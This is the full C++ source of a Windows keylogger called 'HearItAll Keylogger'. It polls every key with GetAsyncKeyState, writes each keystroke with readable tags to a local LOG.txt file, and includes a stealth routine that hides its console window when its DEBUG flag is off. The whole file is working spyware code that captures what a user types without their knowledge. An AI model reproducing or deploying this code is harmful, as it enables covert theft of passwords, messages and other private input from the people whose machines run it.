#include <iostream>
#include <fstream>
#include <string>
#include <time.h>
#include <Windows.h>
#include <winuser.h>

using namespace std;

/*
 * DEBUG global var
 *
 * When is activated the windows does not stealth 
 * and some output will appear on it
 */
bool DEBUG = true;

char *LOG_PATH_NAME = "LOG.txt";

// Function headers
int saveKey (int key_stroke, ofstream *file);
void stealth();
void initialize(ofstream *file);
const string currentDateTime();

int main() 
{
    if(!DEBUG)
        stealth();
    char i;

    // Opens the stream
    ofstream OUTPUT_FILE;
    OUTPUT_FILE.open(LOG_PATH_NAME, ofstream::app);

    initialize(&OUTPUT_FILE);

    // Main loop
    while(true)
        for(i = 8; i <= 190; i++)
            if (GetAsyncKeyState(i) == -32767)
                saveKey(i, &OUTPUT_FILE);

    return 0;
}

// Saves a keystroke in the file
int saveKey (int key_stroke, ofstream *file)
{
    if ((key_stroke == 1) || (key_stroke == 2))
       return 0;
    
    if(DEBUG)
        cout << key_stroke << endl;
    
    switch (key_stroke)
    {
        case 8:
            *file << "[BACKSPACE]"; 
            break;
        case 13:
            *file << "\n";
            break;
        case 32:
            *file << " ";
            break;
        case VK_TAB:
            *file << "[TAB]";
            break;
        case VK_SHIFT:
            *file << "[SHIFT]";
            break;
        case VK_CONTROL:
            *file << "[CONTROL]";
            break;
        case VK_ESCAPE:
            *file << "[ESCAPE]";
            break;
        case VK_END:
            *file << "[END]";
            break;
        case VK_HOME:
            *file << "[HOME]";
            break;
        case VK_LEFT:
            *file << "[LEFT]";
            break;
        case VK_UP:
            *file << "[UP]";
            break;
        case VK_RIGHT:
            *file << "[RIGHT]";
            break;
        case VK_DOWN:
            *file << "[DOWN]";
            break;
        case 190:
        case 110:
            *file <<  ".";
            break;
        default:
            *file << (char) key_stroke;
            break;
    }
    return 0;
}

// Stealth the console 
void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);
}

// Initializes LOG.txt file with some info for the session
void initialize(ofstream *file)
{
    string dateTime = currentDateTime();

    *file << "\n\n\n";
    *file << "**********************************************************\n";
    *file << "****               HearItAll Keylogger                ****\n";
    *file << "****                (Windows Version)                 ****\n";
    *file << "****--------------------------------------------------****\n";
    *file << "****                                                  ****\n";
    *file << "****    Created by: Ander Granado                     ****\n";
    *file << "****                                                  ****\n";
    *file << "**********************************************************\n";
    *file << "****   Session timestamp: ";
    *file << dateTime;
    *file << "         ****\n";
    *file << "**********************************************************\n\n";
}

const string currentDateTime()
{
    time_t rawtime;
	struct tm * timeinfo = (tm*) malloc(sizeof(tm));
    char buffer[80];

    time(&rawtime);
	localtime_s(timeinfo, &rawtime);

    strftime(buffer, 80, "%d-%m-%Y %I:%M:%S", timeinfo);
    string str(buffer);

    if(DEBUG)
        cout << str;

    return str;
}